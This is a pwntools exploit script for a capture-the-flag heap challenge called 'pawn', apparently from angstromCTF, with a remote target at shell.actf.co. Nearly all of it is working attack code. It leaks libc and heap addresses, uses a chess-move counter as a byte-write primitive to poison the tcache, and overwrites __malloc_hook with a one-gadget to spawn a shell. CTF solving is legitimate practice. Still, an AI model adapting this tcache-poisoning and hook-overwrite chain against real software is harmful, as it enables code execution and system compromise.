from pwn import *
context.log_level = 'info'
context.arch = 'amd64'

act = 1

host, port = "shell.actf.co", "21706"
LDPRELOAD = 1
filename = "./pawn"
elf = ELF(filename)

if LDPRELOAD==1:
   libc = ELF('./libc.so.6')
else:
   libc = elf.libc

def getConn():
    if LDPRELOAD == 1:
       return process(filename+'.patched', env={"LD_PRELOAD":libc.path}) if not args.REMOTE else remote(host, port)
    else:
       return process(filename) if not args.REMOTE else remote(host, port)

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    if LDPRELOAD == 1:
       return int(memory_map[1].split("-")[0],16)
    else:
       return int(memory_map[0].split("-")[0],16)

def debug(bp):
    script = "source ~/gdb.plugins/gef/gef.py\n"
    PIE = get_PIE(p)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    script += "c\n"
    gdb.attach(p,gdbscript=script)

p = getConn()
if not args.REMOTE and args.GDB:
	debug([0xeeb])

boards = 0x4040C0
def add(index):
  p.sendlineafter('Delete Board\n', '1')
  p.sendlineafter('index?\n', str(index))

def printb(index):
  p.sendlineafter('Delete Board\n', '2')
  p.sendlineafter('index?\n', str(index))

def delete(index):
  p.sendlineafter('Delete Board\n', '5')
  p.sendlineafter('index?\n', str(index))

def smite(index, x, y):
  p.sendlineafter('Delete Board\n', '4')
  p.sendlineafter('index?\n', str(index))
  p.sendlineafter('spaces.\n', str(x)+' '+str(y))

def move(index, x1, y1, x2, y2):
  p.sendlineafter('Delete Board\n', '3')
  p.sendlineafter('index?\n', str(index))
  p.sendlineafter('spaces.\n', str(x1)+' '+str(y1))
  p.sendlineafter('spaces.\n', str(x2)+' '+str(y2))

# move bishop back and forward to increase t var on .bss (record number of moves)
def inct():
  global act
  if (act & 1):
    # go forward
    move(3, 5, 0, 6, 1)
  else:
    # go back
    move(3, 6, 1, 5, 0)
  act = act + 1
  if (act==256):
   act = 0

# set t (number of moves) by moving piece
def sett(val):
  global act
  if (val==act):
    return
  if (val<act):
    for i in range((0x100 - act)+val):
      inct()
    return
  if (val>act):
    for i in range(val - act):
      inct()
    return

# first we allocate 8 blocs
add(0)
add(1)
add(2)
add(3)
# free them to fill the tcaches
delete(3)
delete(2)
delete(1)
delete(0)

# force allocation in unsorted via a chunk bigger thant stdin buff size 0x1000, will put libc address in chunk0
# to leak a libc address
p.sendlineafter('Delete Board\n', '0'*0x1020+'2\n0\n')
p.recvuntil('-x\n0 ', drop=True)
leak1 = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print('leak1 = {:#x}'.format(leak1))
libc.address = leak1 - 0x1ebc10
print('libc.base = {:#x}'.format(libc.address))

# leak heap address in block 1
printb(1)
p.recvuntil('-x\n0 ', drop=True)
leak2 = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print('leak2 = {:#x}'.format(leak2))

# now we allocate adjacents blocks
add(0)
add(1)
add(2)
add(3)
delete(2)
delete(0)
delete(1)
# move a pawn to init t to 1
move(3, 6, 1, 6, 2)
# set t to 0xa0
sett(0xa0)
# overwrite next block in tcache freed blocs, so that allocating board, will be on an existing bloc of pointers
smite(3, 0x50 ,0)
add(0)
# the second bloc will have his board , allocated at the place of bloc of pointers of another bloc (that we can edit)
add(1)

# prepare our munitions
onegadget = [ 0xe6c7e, 0xe6c81, 0xe6c84]

#dest = libc.symbols['__free_hook']
# finally we will overwrite __malloc_hook
# we will overwrite next free bloc pointer via the board overwriting the bloc of pointers
dest = libc.symbols['__malloc_hook']
for i in range(8):
  sett( (dest>>(i<<3))&0xff)
  smite(3, 0x140+i ,0)
smite(3, 0x140+i ,0)

# put the value to put in __malloc_hook in &starting on bss, so that it will written to the next allocated board
dest =  (0x404020 - (leak2-0x140))
value = libc.address + onegadget[1]
for i in range(8):
  sett( (value>>(i<<3))&0xff)
  smite(3, dest+i ,0)

# allocate bloc on __malloc_hook initialized with data in &starting
add(2)

if args.GDB:
   pause()

# launch a malloc to call the onegadget
add(4)

# we got shell
p.interactive()
